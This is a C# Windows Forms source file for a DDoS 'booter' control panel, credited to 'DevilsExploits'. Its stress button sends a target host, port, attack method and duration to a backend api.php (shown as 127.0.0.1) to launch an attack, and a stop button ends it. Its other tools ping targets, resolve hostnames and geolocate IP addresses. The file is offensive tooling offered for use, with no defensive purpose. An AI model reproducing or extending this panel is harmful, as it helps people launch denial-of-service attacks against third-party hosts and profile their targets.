﻿using System;
using System.Globalization;
using System.Net;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.Windows.Forms;
using MetroFramework.Forms;
using Newtonsoft.Json;

namespace Multi_Panel
{
    public partial class Form1 : MetroForm
    {
        public Form1()
        {
            InitializeComponent();
            MessageBox.Show("This source was Developed by DevilsExploits");
            string externalip = new WebClient().DownloadString("http://icanhazip.com");
            extIP.Text = "External IP : "+externalip;

            var host = Dns.GetHostEntry(Dns.GetHostName());
            foreach (var ip in host.AddressList)
            {
                if (ip.AddressFamily == AddressFamily.InterNetwork)
                {
                    intIP.Text = "Internal IP : "+ip.ToString();
                }
            }
        }

        public static WebClient wc = new WebClient();
        private void stressBtn_Click(object sender, EventArgs e)
        {
            if (!(IPBox.Text.Contains(".") == false))
            {
                if (IPBox.Text == "" || PortBox.Text == "" || TimeBox.Text == "" || MethodBox.Text == "")
                {
                    errorHandler.Text = "You have to fill in all boxes!";
                }
                else if (!(IPBox.Text == "" || PortBox.Text == "" || TimeBox.Text == "" || MethodBox.Text == ""))
                {
                    wc.DownloadString("http://127.0.0.1/api.php?d&host=" + IPBox.Text + "&port=" + PortBox.Text + "&type=" + MethodBox.Text + "&time=" + TimeBox.Text + "");
                    errorHandler.Text = "Attack was successfully sent!";
                }
            }
            else
            {
                errorHandler.Text = "You have to fill in all boxes!";
            }
        }

        private void stopStressBtn_Click(object sender, EventArgs e)
        {
            wc.DownloadString("http://127.0.0.1/api.php?d&host=" + IPBox.Text + "&port=" + PortBox.Text + "&type=STOP&time=" + TimeBox.Text + "");
            errorHandler.Text = "Attack was successfully stopped!";
        }

        private void resolve_Click(object sender, EventArgs e)
        {
            if (typeresolver.Text == "Pinger")
            {
                    bool pingable = false;
                    Ping pinger = null;

                    try
                    {
                        pinger = new Ping();
                        PingReply reply = pinger.Send(targetResolver.Text);
                        pingable = reply.Status == IPStatus.Success;
                    }
                    catch (PingException)
                    {
                        // Discard PingExceptions and return false;
                    }
                    finally
                    {
                        if (pinger != null)
                        {
                            pinger.Dispose();
                        }
                    }

                    if (pingable == true)
                    {
                        targetResolver.Text = "ONLINE";
                    }
                    else if (pingable == false)
                    {
                        targetResolver.Text = "OFFLINE";
                    }
            }


                if (typeresolver.Text == "Host2IP")
            {
                var address = Dns.GetHostAddresses(targetResolver.Text)[0];
                targetResolver.Text = Convert.ToString(address);
            }

            if (typeresolver.Text == "Geo Locator")
            {
                if (!(targetResolver.Text == ""))
                {
                    IpInfo ipInfo = new IpInfo();
                    try
                    {
                        string info = new WebClient().DownloadString("http://ipinfo.io/" + targetResolver.Text);
                        ipInfo = JsonConvert.DeserializeObject<IpInfo>(info);
                        RegionInfo myRI1 = new RegionInfo(ipInfo.Country);
                        ipInfo.Country = myRI1.EnglishName;
                    }
                    catch (Exception)
                    {
                        ipInfo.Country = null;
                    }


                    ipTxt.Text = "IP : " + ipInfo.Ip;
                    countryTxt.Text = "Country : " + ipInfo.Country;
                    regionTxt.Text = "Region : " + ipInfo.Region;
                    hostnameTxt.Text = "Hostname : " + ipInfo.Hostname;
                    orgTxt.Text = "Organization : " + ipInfo.Org;
                }
            }
    }

        private void IPBox_Click(object sender, EventArgs e)
        {
            IPBox.Text = "";
        }

        private void PortBox_Click(object sender, EventArgs e)
        {
            PortBox.Text = "";
        }

        private void TimeBox_Click(object sender, EventArgs e)
        {
            TimeBox.Text = "";
        }

        private void CloseBtn_Click(object sender, EventArgs e)
        {
            System.Windows.Forms.Application.Exit();
        }
    }
}
